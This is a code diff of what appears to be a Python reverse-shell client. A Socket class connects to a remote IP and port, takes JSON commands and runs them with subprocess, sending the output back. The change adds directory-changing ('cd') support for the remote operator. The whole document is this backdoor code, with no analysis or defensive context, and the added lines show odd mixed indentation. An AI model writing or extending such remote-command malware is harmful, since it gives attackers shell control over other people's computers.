@@ -1,6 +1,7 @@
 import socket
 import subprocess
 import json
+import os
 
 class Socket:
 	def __init__(self, ip, port):
@@ -27,6 +28,11 @@ class Socket:
 				return json.loads(json_data)
 			except ValueError:
 				continue
+				
+ 	def execute_cd_command(self, directory):
+ 		os.chdir(directory)
+ 		return 'Cd to ' + directory
+
 
 	def start_socket(self):
 		while True:
@@ -35,7 +41,10 @@ class Socket:
 			if command[0] == 'quit':
 				self.Connection.close()
 				exit()
-			command_output = self.command_execution(command)
+			elif command[0] == 'cd' and len(command) > 1:
+				command_output = self.execute_cd_command(command[1])
+			else:
+				command_output = self.command_execution(command)
 
 			self.json_send(command_output)
 
